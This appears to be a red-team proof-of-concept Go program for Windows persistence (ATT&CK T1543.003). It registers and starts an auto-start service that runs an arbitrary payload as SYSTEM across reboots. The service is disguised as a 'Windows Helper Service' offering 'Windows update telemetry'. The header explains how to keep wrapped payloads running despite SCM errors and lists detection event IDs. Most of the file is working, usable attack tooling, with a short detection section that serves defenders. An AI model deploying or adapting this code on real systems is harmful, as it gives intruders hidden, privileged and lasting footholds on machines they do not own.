// +build windows

// Windows Service Persistence - MITRE ATT&CK T1543.003
//
// Registers a Windows service via the Service Control Manager.  Services run
// as LocalSystem (NT AUTHORITY\SYSTEM) by default and survive user logoff and
// reboot.  Requires administrator privileges.
//
// The SCM expects the service binary to call StartServiceCtrlDispatcher and
// signal SERVICE_RUNNING within ~30 seconds.  Two PoC paths:
//   1. Wrap a non-service payload via "cmd.exe /c <payload>".  SCM marks
//      the service failed (Error 1053) but the payload still executes.
//   2. Build a payload that calls golang.org/x/sys/windows/svc.Run so the
//      service starts cleanly and runs until stopped.
//
// Detection: Event ID 7045 (service installed), Event ID 4697 (security log),
// HKLM\SYSTEM\CurrentControlSet\Services\<name>, autoruns.

package main

import (
	"fmt"
	"os"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

const (
	serviceName        = "WinHelperSvc"
	serviceDisplayName = "Windows Helper Service"
	serviceDescription = "Provides supplemental Windows update telemetry."
)

// InstallService registers a new auto-start service.  exePath is the program
// to run and args are passed as command-line arguments.  Each is escaped
// independently so wrapped commands like  cmd.exe /c calc.exe  work without
// the whole string being wrongly quoted.
func InstallService(exePath string, args []string) error {
	m, err := mgr.Connect()
	if err != nil {
		return fmt.Errorf("SCM connect (need admin?): %w", err)
	}
	defer m.Disconnect()

	if existing, err := m.OpenService(serviceName); err == nil {
		existing.Close()
		return fmt.Errorf("service %q already exists", serviceName)
	}

	s, err := m.CreateService(serviceName, exePath, mgr.Config{
		ServiceType: windows.SERVICE_WIN32_OWN_PROCESS,
		StartType:   mgr.StartAutomatic,
		DisplayName: serviceDisplayName,
		Description: serviceDescription,
	}, args...)
	if err != nil {
		return fmt.Errorf("CreateService: %w", err)
	}
	defer s.Close()

	fmt.Printf("[+] Service installed: %s (args: %v)\n", exePath, args)
	return nil
}

// StartService starts the installed service immediately.
func StartService() error {
	m, err := mgr.Connect()
	if err != nil {
		return fmt.Errorf("SCM connect: %w", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(serviceName)
	if err != nil {
		return fmt.Errorf("OpenService: %w", err)
	}
	defer s.Close()

	if err := s.Start(); err != nil {
		return fmt.Errorf("Start: %w", err)
	}
	fmt.Printf("[+] Service started: %s\n", serviceName)
	return nil
}

// UninstallService stops and removes the service (cleanup helper).
func UninstallService() error {
	m, err := mgr.Connect()
	if err != nil {
		return err
	}
	defer m.Disconnect()

	s, err := m.OpenService(serviceName)
	if err != nil {
		return err
	}
	defer s.Close()

	// Best-effort stop; ignore error if not running.
	s.Control(svc.Stop)

	if err := s.Delete(); err != nil {
		return fmt.Errorf("Delete: %w", err)
	}
	fmt.Printf("[+] Service removed: %s\n", serviceName)
	return nil
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("usage: persistence_service.exe <install|start|remove> [exe] [args...]")
		fmt.Println(`  example: persistence_service.exe install cmd.exe /c calc.exe`)
		return
	}

	switch os.Args[1] {
	case "install":
		exePath := os.Args[0]
		var args []string
		if len(os.Args) >= 3 {
			exePath = os.Args[2]
			args = os.Args[3:]
		}
		if err := InstallService(exePath, args); err != nil {
			fmt.Println("[-]", err)
		}
	case "start":
		if err := StartService(); err != nil {
			fmt.Println("[-]", err)
		}
	case "remove":
		if err := UninstallService(); err != nil {
			fmt.Println("[-]", err)
		}
	default:
		fmt.Println("unknown command:", os.Args[1])
	}
}
